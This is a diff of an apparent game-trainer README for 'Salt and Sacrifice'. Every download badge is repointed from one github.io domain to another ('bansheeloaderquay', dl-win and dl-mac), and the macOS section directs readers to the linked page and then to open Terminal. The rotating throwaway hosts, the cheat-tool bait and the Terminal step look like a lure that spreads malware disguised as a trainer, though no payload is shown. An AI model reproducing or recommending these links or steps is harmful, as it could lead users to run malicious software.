@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download Salt and Sacrifice Trainer](https://img.shields.io/badge/⬇_Download_Salt%20and%20Sacrifice_Trainer-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Download Salt and Sacrifice Trainer](https://img.shields.io/badge/⬇_Download_Salt%20and%20Sacrifice_Trainer-E63946?style=for-the-badge&logo=github)](https://bansheeloaderquay.github.io/dl-win/)
 
 </div>
 
@@ -78,9 +78,9 @@ Salt and Sacrifice is the sequel to Salt and Sanctuary featuring online co-op, m
 
 <div align="center">
 
-[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://bansheeloaderquay.github.io/dl-win/)
 
-[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://bansheeloaderquay.github.io/dl-mac/)
 
 </div>
 
@@ -101,7 +101,7 @@ Salt and Sacrifice is the sequel to Salt and Sanctuary featuring online co-op, m
 
 <div align="center">
 
-[![⬇ Download Salt and Sacrifice Trainer](https://img.shields.io/badge/⬇_Download_Salt%20and%20Sacrifice_Trainer-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Download Salt and Sacrifice Trainer](https://img.shields.io/badge/⬇_Download_Salt%20and%20Sacrifice_Trainer-E63946?style=for-the-badge&logo=github)](https://bansheeloaderquay.github.io/dl-win/)
 
 </div>
 
@@ -133,7 +133,7 @@ Salt and Sacrifice is the sequel to Salt and Sanctuary featuring online co-op, m
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://bansheeloaderquay.github.io/dl-mac/)
 
 1. Click the badge above to open the macOS trainer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -158,7 +158,7 @@ Salt and Sacrifice is the sequel to Salt and Sanctuary featuring online co-op, m
 
 <div align="center">
 
-[![⬇ Download Salt and Sacrifice Trainer](https://img.shields.io/badge/⬇_Download_Salt%20and%20Sacrifice_Trainer-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Download Salt and Sacrifice Trainer](https://img.shields.io/badge/⬇_Download_Salt%20and%20Sacrifice_Trainer-E63946?style=for-the-badge&logo=github)](https://bansheeloaderquay.github.io/dl-win/)
 
 </div>
 
